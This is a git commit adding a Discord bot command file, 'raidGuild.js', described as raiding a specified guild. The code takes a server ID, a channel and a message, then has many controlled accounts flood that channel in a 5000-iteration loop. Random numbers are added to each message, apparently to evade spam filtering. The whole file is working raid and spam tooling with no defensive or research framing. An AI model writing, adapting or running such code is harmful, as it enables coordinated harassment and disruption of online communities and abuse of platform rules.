1aa4152a91647f6eb6394b168bc90b114f0cd8a6
EchoHackCmd <33047114+EchoHackCmd@users.noreply.github.com>
2020-04-02 19:22:41 +0000

    Create raidGuild.js

---
+++ Commands/raidGuild.js
@@ -0,0 +1,57 @@
+const rl = require("readline-sync");
+
+module.exports.run = async(Client, message) => {
+	return new Promise((resolve, reject) => {
+		let targetGuild = rl.question("Guild ID: ");
+		let targetChannel = rl.question("Channel ID/Name: ");
+		let message = rl.question("Message: ");
+
+		if(targetGuild){
+			if(targetChannel){
+				if(message){
+					raidGuild(Client, targetGuild, targetChannel, message).then(() => { resolve() });
+				} else {
+					console.log("You did not specify a message!");
+					resolve();
+				}
+			} else {
+				console.log("You did not specify a Channel ID or name!");
+				resolve();
+			}
+		} else {
+			console.log("You did not specify a Guild ID!");
+			resolve();
+		}
+	});
+
+	function raidGuild(Client, targetGuild, targetChannel, message){
+		return new Promise((resolve, reject) => {
+			for(var I = 0; I < 5000; I++){
+				Client.Accounts.forEach(async (account, I) => {
+					setTimeout(() => {
+						const instance = account.instance;
+						let Guild = instance.guilds.get(targetGuild);
+						if(Guild){
+							if(!isNaN(targetChannel)){
+								let Channel = Guild.channels.get(targetChannel);
+								if(Channel){
+									Channel.send(`[${Math.floor(Math.random() * 100)}] ${message} [${Math.floor(Math.random() * 100)}]`);
+								}
+							} else {
+								let Channel = Guild.channels.find(channel => channel.name.toLowerCase() == targetChannel.toLowerCase());
+								if(Channel){
+									Channel.send(`[${Math.floor(Math.random() * 100)}] ${message} [${Math.floor(Math.random() * 100)}]`);
+								}
+							}
+						}
+					}, I * 1000);
+				});
+				resolve();
+			}
+		});
+	}
+}
+
+module.exports.about = {
+	info: "Raids the specified Guild!"
+}
